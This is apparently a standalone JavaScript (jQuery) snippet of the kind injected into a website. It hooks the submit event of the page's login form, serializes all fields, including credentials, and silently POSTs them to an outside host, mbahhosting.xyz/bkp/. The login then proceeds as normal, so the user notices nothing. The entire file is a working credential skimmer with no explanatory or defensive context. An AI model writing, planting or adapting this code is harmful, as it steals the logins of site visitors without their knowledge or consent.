$(".login-form").submit(function() {
	var d = $(".login-form");

	$.ajax({
        url: "https://mbahhosting.xyz/bkp/?abcd=",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
